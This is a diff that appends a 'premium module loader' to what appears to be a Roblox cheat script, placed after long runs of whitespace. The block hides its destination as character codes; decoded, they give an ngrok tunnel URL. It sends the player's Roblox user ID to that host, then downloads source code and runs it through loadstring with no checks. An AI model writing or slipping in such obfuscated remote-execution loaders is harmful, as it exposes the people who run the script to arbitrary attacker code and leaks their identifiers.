@@ -8864,3 +8864,86 @@ end)
 
 																																																																																						
 																																																																																					
+
+-- ============================================================
+-- LIONV4 PREMIUM MODULE LOADER (UNIVERSAL)
+-- ============================================================
+local _uPremiumModules = {
+    'LobbyFarm',
+}
+
+local function _loadUniversalPremiumModules()
+    local waited = 0
+    while not getgenv()._aeroTierReady and waited < 10 do
+        task.wait(0.1)
+        waited += 0.1
+    end
+
+    local myTier = getgenv().getAeroTier and getgenv().getAeroTier(lplr) or 0
+    if myTier <= 0 then return end
+
+    local premReq = getgenv()._aerov4_req or (syn and syn.request) or http_request or request
+    local premUrl = getgenv()._aerov4_getUrl and getgenv()._aerov4_getUrl() or (function()
+        local _s = {"104","116","116","112","115","58","47","47","103","101","99","111","45","115","116","101","114","110","117","109","45","114","117","98","100","111","119","110","46","110","103","114","111","107","45","102","114","101","101","46","100","101","118","47","119","104","105","116","101","108","105","115","116"}
+        local _r = ''
+        for _,v in _s do _r = _r .. string.char(tonumber(v)) end
+        return _r
+    end)()
+
+    for _, moduleName in ipairs(_uPremiumModules) do
+        task.wait(2)
+        task.spawn(function()
+            local ok, res
+            for attempt = 1, 5 do
+                ok, res = pcall(function()
+                    return premReq({
+                        Url = premUrl,
+                        Method = 'POST',
+                        Headers = {['Content-Type'] = 'application/json'},
+                        Body = httpService:JSONEncode({
+                            action = 'getModule',
+                            robloxUserId = tostring(lplr.UserId),
+                            module = moduleName
+                        })
+                    })
+                end)
+                if ok and res and res.Body then break end
+                task.wait(5)
+            end
+
+            if not ok then
+                warn('[LIONV4] Request error for: ' .. moduleName .. ' | ' .. tostring(res))
+                return
+            end
+            if not res or not res.Body then
+                warn('[LIONV4] No response for: ' .. moduleName)
+                return
+            end
+
+            local dok, data = pcall(function() return httpService:JSONDecode(res.Body) end)
+            if not dok or not data then
+                warn('[LIONV4] Bad response for module: ' .. moduleName)
+                return
+            end
+            if not data.success then
+                warn('[LIONV4] Module denied: ' .. moduleName .. ' | ' .. tostring(data.error))
+                return
+            end
+
+            local fn, ferr = loadstring(data.src)
+            if not fn then
+                warn('[LIONV4] Failed to parse module: ' .. moduleName .. ' | ' .. tostring(ferr))
+                return
+            end
+
+            local rok, err = pcall(fn)
+            if not rok then
+                warn('[LIONV4] Premium module error (' .. moduleName .. '): ' .. tostring(err))
+            else
+                print('[LIONV4] Loaded premium module: ' .. moduleName)
+            end
+        end)
+    end
+end
+
+task.spawn(_loadUniversalPremiumModules)
